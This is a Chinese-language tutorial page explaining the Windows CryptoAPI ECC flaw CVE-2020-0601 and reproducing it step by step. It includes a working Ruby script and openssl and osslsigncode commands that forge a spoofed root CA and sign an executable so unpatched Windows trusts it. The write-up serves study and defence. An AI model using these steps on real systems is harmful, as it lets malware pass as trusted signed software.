<!doctype html><html lang=tw><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 | 极客快訊</title><meta property="og:title" content="四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="tw"><meta property="og:image" content="https://p1.pstatp.com/large/pgc-image/0d55c336fcb743e1b68e167ab3917e4c"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/652b4f6.html><meta property="article:published_time" content="2020-10-29T21:04:28+08:00"><meta property="article:modified_time" content="2020-10-29T21:04:28+08:00"><meta name=Keywords content><meta name=description content="四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現"><meta name=author content="极客快訊"><meta property="og:url" content="/tw/%E7%A7%91%E6%8A%80/652b4f6.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快訊 Geek Bank</a></h1><p class=description>為你帶來最全的科技知識 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=tw/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><p>一.漏洞背景</p><p>1月15日，微軟發佈了針對CVE-2020-0601的安全補丁，該漏洞是微軟在實現橢圓曲線加密(ECC)算法數字證書驗證時產生，位於CryptoAPI.dll文件，可被利用於偽造來自可信任來源的簽名或證書，並且因其業務特性會衍生出多種攻擊向量，具有極高的可利用價值和極大的潛在破壞力，Win10和windows server 2016 & 2019也都在其影響範圍內。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/0d55c336fcb743e1b68e167ab3917e4c><p class=pgc-img-caption></p></div><p>有意思的是，在微軟發佈公告後，NSA也發佈了關於CVE-2020-0601漏洞的預警通告。根據通告可以得知，這個漏洞是由NSA率先獨立發現並彙報給微軟的（微軟在報告中對NSA致謝），也被認為是第一個NSA公開披露的軟件系統漏洞，當然也有可能存在其特殊的戰術目的。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/08a9f6589d6e44f68a5c419f0f90c04b><p class=pgc-img-caption></p></div><p>該漏洞位於Windows CryptoAPI(Crypt32.dll)驗證橢圓曲線加密算法證書的方式，可能影響信任的一些實例包括：</p><p>HTTPS連接</p><p>文件簽名</p><p>電子郵件簽名</p><p>以用戶模式啟動的簽名可執行程序</p><p>此外，該漏洞可以讓攻擊者偽造代碼簽名證書對惡意可執行文件進行簽名，使文件看似來自可信的來源。例如，可以讓勒索軟件或其他間諜軟件擁有看似有效的證書，從而促使用戶安裝。中間人攻擊並解密用戶連接到受影響軟件的機密信息也是主要的攻擊場景之一。</p><p>目前，支持使用帶有指定參數的ECC密鑰的證書的Microsoft Windows版本會受到影響，包括了Windows 10、Windows Server 2016/2019以及依賴於Windows CryptoAPI的應用程序。而Windows 10 之前的版本，如Windows 7、Windows Server 2008 R2 等均不受該漏洞的影響。因為win7沒有默認添加微軟的ECC根證書，crypt32.dll裡面也沒這個hash值，沒法直接對比通過，故不受影響。</p><h1 class=pgc-h-arrow-right>二.漏洞原理</h1><p>該部分主要參考下面兩篇文章，再次感謝，也強烈推薦大家閱讀這兩位老師的博客。花這麼多篇幅介紹原理知識，一方面是完善自己的安全知識體系，另一方面只有深入瞭解原理才能更好地做防禦。<br></p><p>1.ECC加密算法</p><p>CVE-2020-0601的根源是微軟的加密庫crypt32.dll中橢圓曲線加密算法的實現問題，首先我們來了解一下橢圓加密算法的基本原理。</p><p>基礎知識</p><p>ECC私鑰+橢圓曲線=ECC公鑰</p><p>漏洞成因</p><p>微軟的私鑰+微軟選的橢圓曲線=微軟根證書裡面的公鑰</p><p>黑客的私鑰+黑客選的橢圓曲線=微軟根證書裡面的公鑰</p><p>不同的橢圓曲線和不同的私鑰，能產生一模一樣的公鑰。win10默認添加了微軟的ECC根證書，在做證書驗證時，會一直驗證到微軟根證書中的公鑰hash值，這個值直接寫在了crypt32.dll裡面，驗證時沒有對比是不是同一個橢圓曲線，只對比了公鑰值，導致了黑客拿自己的私鑰簽名，就能偽裝成微軟的簽名。</p><p>ECC算法</p><p>要形象地理解橢圓曲線加密算法，可以結合圖形來看，以下是一個符合橢圓曲線的方程及圖像。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/fec7848b71524aaba46d0ef0447dfc88><p class=pgc-img-caption></p></div><p>橢圓曲線具有的一些獨特的性質使它適合用於加密算法：</p><p>橢圓曲線關於x軸對稱</p><p>任何一條非垂直的線與曲線最多有三個點相交</p><p>曲線是光滑的，即曲線的所有點都沒有兩個或者兩個以上的不同的切線</p><p>在橢圓曲線上任意兩點A、B（若A、B重合則作A的切線），作直線交於橢圓曲線另一點C’，過C’做y軸的平行線與橢圓曲線交於C點，定義A+B=C。橢圓曲線的加法符合交換律和結合律。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/f15d229108d8401ba79857e82a26587b><p class=pgc-img-caption></p></div><p>如果A、B是同一個點，則過A作橢圓曲線的切線，以同樣的方法得到對應的結果 C=2A 。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/68c47453da1a4cf4b60d688614fb0a39><p class=pgc-img-caption></p></div><p>接下來是橢圓曲線加密相關的重點，如果對多個A進行累加，則可依次累加連線得到nA的值 。</p><ul><li>(1) 起點為A，終點D=3A，階為3 。</li><li>(2) 起點為A，終點G=4A，階為4。</li></ul><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f3c7c77ecf83433f9761f4adb30bce2b><p class=pgc-img-caption></p></div><p>橢圓曲線加密算法的數學依據 :</p><p>考慮K=kG，其中K、G為橢圓曲線Ep(a,b)上的點，n為G的階。k為小於n的整數。給定k和G，根據加法法則計算K很容易（逐次求解）；但反過來，給定K和G，求k就非常困難。因為實際使用中的ECC原則上把私鑰k取得相當大，n也相當大，且橢圓曲線不再連續而是在實數內離散的值，要把n個解點逐一算出幾乎是不可能的。</p><p>點G稱為基點</p><p>k(k&lt;n)為私有密鑰</p><p>K為公開密鑰</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/22cf7becfec540d2b91f62fc56e11289><p class=pgc-img-caption></p></div><p>ECC和RSA加密算法對比：</p><p>橢圓曲線加密算法（ECC）和RSA同樣是一種公開密鑰加密技術，對原始數據以公鑰加密，以私鑰解密，即便攻擊者獲取密文和公鑰也無法（在合理的時間或代價下）解密獲取明文。ECC常被應用於數字簽名，以私鑰加密生成簽名，以公鑰解密驗證簽名，如果和原文一樣則簽名驗證成功。公開密鑰加密之所以可靠是因為它們利用了公鑰密碼領域的單向函數原理，正向操作非常簡單，而逆向操作非常困難。由G（基點）出發，進行k（私鑰）次變換，很容易地得到終點K（公鑰）的值。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/4fd8e0f665bd4986870eef355aa0111d><p class=pgc-img-caption></p></div><p>已知起點G（基點）和終點K（公鑰），要逆推得到移動次數k（私鑰）則是一個很難的問題。相比傳統RSA加密算法，橢圓加密算法具有著天生的優勢，橢圓加密算法的逆向過程相比RSA有著更大的時間複雜度。在密鑰長度相同的情況下，橢圓加密算法相比RSA具有更好的安全強度。 一般認為，160比特的橢圓曲線密鑰即可提供與1024比特的RSA密鑰相當的安全強度。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/e0710e0bb6e34934814668ae3a7c3f5f><p class=pgc-img-caption></p></div><p>較短的密鑰也意味著更少的存儲空間、更快的加解密速度和更少的帶寬消耗，正因為橢圓加密算法的這些優勢，它被用於Windows的簽名系統、https的證書、比特幣系統和中國的二代身份證系統中。</p><p>雖然橢圓曲線加密算法具有著許多優勢，純算法角度攻破難度極大，微軟對此算法的實現的缺漏卻給漏洞利用提供了可乘之機。回到橢圓曲線加密最基本的等式 K=kG，首先需要明確的是，雖然對於給定的基點G和公鑰K，要求解私鑰k很困難，但是如果可以任意指定基點G，要構造一對k和G使等式成立卻極其簡單。最簡單的情況，令基點G=K，則私鑰k=1，這樣一對基點和私鑰可以使等式成立，也是有效的解。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/27af91050cf74a708e5fc6ab0da4b418><p class=pgc-img-caption></p></div><p>在正常的標準橢圓曲線算法中，基點G並不是隨意指定的，而是有固定的值（標準文件會對基點G等參數的選擇做出規定），例如在secp256r1版本的橢圓曲線算法中，基點G應當為標準規定的固定值，如果對參數不加驗證，使得用戶可以自定義傳入的基點G值（作為函數的參數），上面的私鑰k=1的特殊解即可成立。</p><p>在有漏洞版本的crypt32.dll中驗證使用ECC算法簽名部分的函數恰恰是這個情況，原先的函數未加參數驗證，參與計算的基點G的內容由被驗證的證書隨意指定，使未授權的證書能夠構建私鑰k=1的特殊解來成功通過橢圓加密算法的簽名驗證的過程。</p><p>2.Windows證書驗證</p><p>以SSL協議為例，講解Windows如何進行證書驗證。比如，小明（m）在某電商（x）網站上購買了一本書，這時就調用了SSL協議進行通訊，建立SSL協議的步驟總結為下圖。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/c0617271a51b4f22b0e8e99339757574><p class=pgc-img-caption></p></div><p>基本步驟包括：</p><p>① 打招呼： 小明和電商互相介紹自己，小明和電商協商好以後的步驟裡將使用到的特定密碼算法。在本漏洞中，該算法為ECC加密算法。（該步驟沒有利用密碼工具）</p><p>② 身份驗證： 電商向小明驗證自己的身份，電商發送包含自己的公鑰的證書。該證書由權威的第三方證書機構（CA）頒發。小明使用CA的公開驗證密鑰，驗證證書中對PK的簽名。（漏洞觸發地方）</p><p>③ 信息加密： 由小明生成一個隨機的密鑰MS，該密鑰用於生成對雙方傳輸的信息進行對稱加密的K1與K2。MS由小明獲得的公鑰進行加密並交給電商。電商通過手中的私鑰解密獲得MS。這時雙方都獲得了用於進行加密通訊的密鑰。</p><p>注意：</p><p>在SSL會話過程中，只有電商一方被要求提供證書，小明可能根本沒有公鑰（或證書）。這和我們平時去小賣部買東西一樣，銷售方需要提供銷售許可, 而你只需要付錢就可以了。</p><p>該漏洞的觸發點在於 第三方權威機構（Windows） 在步驟②驗證證書時產生的邏輯漏洞，使得攻擊者可以通過偽造證書將自身偽裝成電商， 與小明 進行通訊。從而達到騙財騙色騙信息的目的。</p><p>通過及時更新微軟補丁包可以有效防止上述情況的發生。</p><p>接著我們分享微軟驗證證書的機制，以及其存在的邏輯漏洞。</p><p>在Windows系統訪問一個網站(例Github.com)時, 該網站會向Windows系統發送由第三方權威機構(CA)簽署的網站證書。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/6a60187ab59746818e1555167d80e9ad><p class=pgc-img-caption></p></div><li>Windows系統則會驗證該證書是否由CA頒發，若驗證通過，則Windows系統與網站成功建立TLS鏈接。</li><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/6658df949f8b49f186ee4d2d4c0e02c0><p class=pgc-img-caption></p></div><p>為了方便下一次更快的訪問，Windows將驗證成功的證書放入內存中一塊Certificate Cache（證書緩存）中。在下一次校驗時，如果該證書存在於緩存中，則直接取緩存中的值進行校驗。這裡利用CVE-2020-0601。<br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/b7f82d74ce1c441abd23e9d6528af123><p class=pgc-img-caption></p></div><p>在成功緩存證書數據後，根據下面描述的Windows證書緩存機制，惡意網站可以偽造虛假的網站（例github.com）證書且通過Windows驗證，將自身偽裝成合法網站。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/746348cce5d0475fb415c34c2b3bf036><p class=pgc-img-caption></p></div><p>當 Windows 接收到新的證書時，Windows 將新接收的證書與已緩存證書的證書的公鑰進行遍歷對比，尋找匹配的值。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/80e69e0e37f44d6889803afed7b82fa9><p class=pgc-img-caption></p></div><p>偽造的惡意證書與Windows系統中的緩存證書有同樣的公鑰，但Curve項沒有在校驗範圍內，所以可以通過構造自定義Curve來偽造證書。使得證書驗證流程依然成立，但通過驗證的證書已經不是之前成功驗證的安全證書。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/d54ebcce404849c885f669c12aa37d3e><p class=pgc-img-caption></p></div><p><strong>寫到這裡，如果您懵圈了，沒關係！我也哭暈了好幾次，都發求救貼了，接著我們看看實際操作吧~</strong></p><h1 class=pgc-h-arrow-right>三.可執行文件簽名漏洞利用</h1><h2 class=pgc-h-arrow-right>1.證書查看</h2><p>首先，我帶領大家看看Windows證書。運行中輸入“certmgr.msc”，可以看到這裡面有5個系統默認的ECC簽名的根證書，如下圖所示。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/e056d832309f4f009c15c5f3e859d3c5><p class=pgc-img-caption></p></div><p>我們隨意導出其中一個根證書，導出直接選擇Base64編碼那個就行。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/0116119722f84712b965536b815ee97f><p class=pgc-img-caption></p></div><p>可以看到導出的ECC密鑰證書如下圖所示，包括證書的有效期等信息。這就是微軟在實現橢圓曲線加密（ECC）算法的數字證書，位於CryptoAPI.dll文件，也是被我們利用來偽造可信任來源的簽名漏洞。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/abd39f25f8194a81bfd0b2dbf12743a2><p class=pgc-img-caption></p></div><p>同樣，我們可以通過Powershell（其用法推薦前文）查看默認的根證書。</p><pre><code>dir cert:\localmachine\root | Where-Object { $_.FriendlyName -like "*ECC*" }</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/f6e28ca07a43473e9fdf1804feb9ead6><p class=pgc-img-caption></p></div><p>2.環境搭建</p><p>Linux系統、Windows系統WSL軟件（Windows Subsystem for Linux）</p><p>Ruby環境、Python環境</p><p>Github資源：main.rb、openssl_cs.conf、簽名證書</p><p>可執行exe文件（用於簽名</p><p>由於作者是Windows環境，但需要運行Linux命令，所以這裡安裝了Windows Subsystem for Linux軟件。</p><p>第一步，打開應用商城搜索“WSL”，可根據自己需求選擇安裝一個或多個Linux系統。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/1a44796246504dc6b5a1706020857ba0><p class=pgc-img-caption></p></div><p><strong>第二步，安裝完成後可以在開始菜單的最近添加中打開Ubuntu。第一次打開Ubuntu時，會提示你創建新的用戶賬戶和密碼。這個用戶賬戶只是普通的非管理員用戶，如果要提升權限，需要使用sudo命令。</strong></p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/e0f6447b047649298ac015adc01ca3e1><p class=pgc-img-caption></p></div><p>下面可以測試該環境已經搭建成功，我們能在Windows系統下運行Linux。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/412614dd4c4845798afec1d7467b3946><p class=pgc-img-caption></p></div><p><strong>第三步，我們複製文件進入。作者使用WSL，主要還因為它的另一個優勢，能夠訪問Windows系統的內容，靈活複製和切換文件。</strong></p><ul><li>(1) 可以在wsl終端輸入以下命令 cd /mnt</li><li>(2) 可以在wsl終端輸入以下命令 explorer.exe .</li><li>(3) 複製ca.cer文件</li></ul><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/343b86a27af54d1fb3af817f4981e974><p class=pgc-img-caption></p></div><p>路徑為：\wsl$\Ubuntu\home\yxz</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/97031cc3026f42cf95f246e59dae77a8><p class=pgc-img-caption></p></div><p><strong>第四步，使用openssl查看證書信息的內容，後面我們會反覆使用該命令。</strong></p><pre><code>openssl x509 -in ca.cer -text -noout</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f0b278071d8c4f0a86f6340ff6edd7d1><p class=pgc-img-caption></p></div><blockquote class=pgc-blockquote-abstract><p>在計算機網絡上，OpenSSL是一個開放源代碼的軟件庫包，應用程序可以使用這個包來進行安全通信，避免竊聽，同時確認另一端連接者的身份。這個包廣泛被應用在互聯網的網頁服務器上。</p></blockquote><p>3.漏洞還原</p><p>接下來將詳細講解如何還原可執行文件簽名證書偽裝漏洞。</p><p>第一步，安裝Ruby環境並測試。</p><p>安裝環境：sudo apt install ruby</p><p>查看版本：ruby -v</p><p>創建文件：touch HelloWorld.ry</p><p>編輯代碼：vim HelloWorld.ry</p><p>運行代碼：ruby HelloWorld.ry</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/292e26fa0af8404e8b722c7d18a0f3ea><p class=pgc-img-caption></p></div><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/63399b2d411248549cca347b23ed9446><p class=pgc-img-caption></p></div><p><strong>第二步，提取ECC根證書公鑰信息。</strong><br>將main.rb文件和導出的微軟ECC簽名證書文件複製或上傳至Linux系統或WSL。注意，這裡的ECC證書也可以使用上面我們導出的那個文件。</p><p>接著運行ruby代碼。</p><pre><code>ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/9162c3dbf6fc431aa01e852cd972e3ee><p class=pgc-img-caption></p></div><p>此時生成“spoofed_ca.key”公鑰文件</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/a99ee498c26442d19c88e0130ba7012d><p class=pgc-img-caption></p></div><p>main.rb代碼如下，設置私鑰為1，使得加密等式成立，並生成證書公鑰文件。</p><pre><code>require 'openssl'raw = File.read ARGV[0] 	# 讀取使用ECC算法的證書文件ca = OpenSSL::X509::Certificate.new(raw) 	# 讀取使用ECC算法的證書ca_key = ca.public_key 	    # 從證書中提取公鑰ca_keyca_key.private_key = 1    	# 設置私鑰為1，使得公鑰K==1*基點G的等式成立group = ca_key.group group.set_generator(ca_key.public_key, group.order, group.cofactor)group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVEca_key.group = group 		# 利用構建的假基點G和假密鑰k設置新groupFile.open("spoofed_ca.key", 'w') { |f| f.write ca_key.to_pem } 	# 將新的group寫入文件</code></pre><p><strong>第三步，基於此密鑰生成一個新的x509證書，這將是我們自己的欺騙性CA。</strong></p><pre><code>openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/a8f0b53c338348f9b622a703ff6767a5><p class=pgc-img-caption></p></div><p>注意，國家、地區、作者可以隨意填寫，此時生成“spoofed_ca.crt”公鑰文件。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/a7feb7c8c75744baa5656e0c485f2fdc><p class=pgc-img-caption></p></div><p><strong>第四步，生成一個新密鑰。該密鑰可以是您想要的任何類型，它將用於創建代碼簽名證書，我們將使用自己的CA對其進行簽名。</strong></p><pre><code>openssl ecparam -name secp384r1 -genkey -noout -out cert.key</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/e73cc96899f74f13bbe1b38f281ebcf8><p class=pgc-img-caption></p></div><p>此時生成“cert.key”新密鑰文件。</p><p><strong>第五步，接下來創建一個新的證書籤名請求（CSR）。該請求通常會發送到受信任的CA，但是由於存在欺騙請求，因此我們可以自己對其進行簽名。</strong></p><pre><code>openssl req -new -key cert.key -out cert.csr -config openssl_cs.conf -reqexts v3_cs</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/709920756f6940609b6c62fce6409cb6><p class=pgc-img-caption></p></div><p>注意，需要複製openssl_cs.conf文件進去，此時生成“cert.csr”文件。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/8e85c5a2d602430b94cb54650b9ae729><p class=pgc-img-caption></p></div><p><strong>第六步，使用我們的欺騙性CA和CA密鑰簽署新的CSR。該證書將在2047年到期，而真正的受信任Microsoft CA將在2043年到期。</strong><br></p><pre><code>openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_cs.conf -extensions v3_cs</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/21aa620974ff4ebcb0d06beebda1ee66><p class=pgc-img-caption></p></div><p>生成“cert.crt”簽名證書文件。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/24666d00f0614db487b872f5b8444a77><p class=pgc-img-caption></p></div><p><strong>第七步，將證書的密鑰和欺騙性的CA打包到一個PKCS12文件中，以對可執行文件進行簽名。</strong></p><pre><code>openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile spoofed_ca.crt -name "Code Signing" -out cert.p12</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/854c13b10fc44a2598220dda1803f365><p class=pgc-img-caption></p></div><p>生成“cert.p12”名證書文件。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/b9654337a5c24aa3bf2e843652d893a4><p class=pgc-img-caption></p></div><p><strong>第八步，用PKCS12文件簽名可執行文件。</strong></p><pre><code>osslsigncode sign -pkcs12 cert.p12 -n "Signed by ollypwn" -in python.exe -out python_signed.exe</code></pre><p>注意，osslsigncode可能需要安裝，如下所示。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/d2d8df561eba4d15931dade6c94c494b><p class=pgc-img-caption></p></div><p>用PKCS12文件簽名可執行文件，最終生成“python_signed.exe”簽名可執行文件。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/b6343aa0fa4d4ebc98b40da09cc9fae9><p class=pgc-img-caption></p></div><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/7153e330520b45438119c178ddd14f70><p class=pgc-img-caption></p></div><p><strong>第九步，文件右鍵”屬性“打開，如下所示，多了”數字簽名“且能看查看”詳細信息”。</strong></p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f56aa767aa68428f88ab64de10f0c87d><p class=pgc-img-caption></p></div><p>點擊”查看證書”，可以看到具體信息，比如2047年到期，頒發者為我們設置的“hacker”，以及設置的簽名信息，並且證書是可靠地。該可執行文件的數字簽名校驗通過，並且成功欺騙了系統。</p><p><br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/69535802bf404fffa7cdfd45142742ae><p class=pgc-img-caption></p></div><p>如果更新補丁知乎，可執行文件的數字簽名會無法驗證。<br></p><div class=pgc-img><img alt=四十六，微軟證書漏洞Windows驗證機制及可執行文件簽名復現 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/3221901fbda64e53af68930eb38a4151><p 